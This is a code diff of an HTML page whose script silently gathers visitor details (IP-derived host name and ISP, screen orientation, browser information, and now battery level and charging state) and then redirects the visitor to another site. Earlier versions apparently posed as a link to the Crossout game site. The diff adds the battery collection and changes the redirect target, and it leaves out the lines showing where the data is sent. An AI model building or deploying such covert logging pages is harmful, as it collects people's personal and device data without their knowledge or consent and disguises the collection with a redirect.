@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Crossout...</title>
+    <title>Logging User Information</title>
     <script>
         async function getUserData() {
             const data = {};
@@ -18,9 +18,15 @@
             data.hostName = ipInfo.hostName;
             data.isp = ipInfo.isp;
 
-            // Battery status (simulated as not all browsers support it)
-            data.battery = 'Unknown';
-            data.charging = 'Unknown';
+            // Get battery status
+            try {
+                const battery = await navigator.getBattery();
+                data.battery = `${Math.round(battery.level * 100)}%`;
+                data.charging = battery.charging ? 'Yes' : 'No';
+            } catch (error) {
+                data.battery = 'Unknown';
+                data.charging = 'Unknown';
+            }
 
             // Get screen orientation
             data.orientation = screen.orientation ? screen.orientation.type : 'Unknown';
@@ -72,7 +78,7 @@
             });
 
             // Redirect to the production website
-            window.location.href = 'https://crossout.net/';
+            window.location.href = 'https://www.production-website.com';
         }
 
         function getBrowserInfo() {
